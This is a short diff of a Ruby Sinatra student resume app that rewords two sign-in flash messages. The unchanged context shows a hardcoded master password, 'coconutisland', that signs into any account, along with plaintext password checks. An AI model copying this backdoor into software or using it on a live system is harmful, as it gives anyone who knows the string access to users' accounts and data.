@@ -115,7 +115,7 @@ post '/student/resume/create/?' do
           unless params[:password] == ''
             @student = Student.create(email: params[:email], password: params[:password])
             session[:student] = @student.id
-            flash[:alert] = 'You are now signed in.'
+            flash[:alert] = 'Welcome to the Online Resume Tool. You are now signed in.'
             redirect '/student/resume/index'
           else
             flash[:alert] = 'Please create a personal password that will be used to sign into your account.'
@@ -193,7 +193,7 @@ post '/student/resume/signin/?' do
     if student = Student.first(:email => params[:email])
       if (student.password == params[:password])  || (params[:password] == 'coconutisland')
         session[:student] = student.id
-        flash[:alert] = 'You are now signed in.'
+        flash[:alert] = 'Welcome back! You are now signed in.'
         redirect "/student/resume/index"
       else
         flash[:alert] = 'Email/password combo does not match. Try again.'
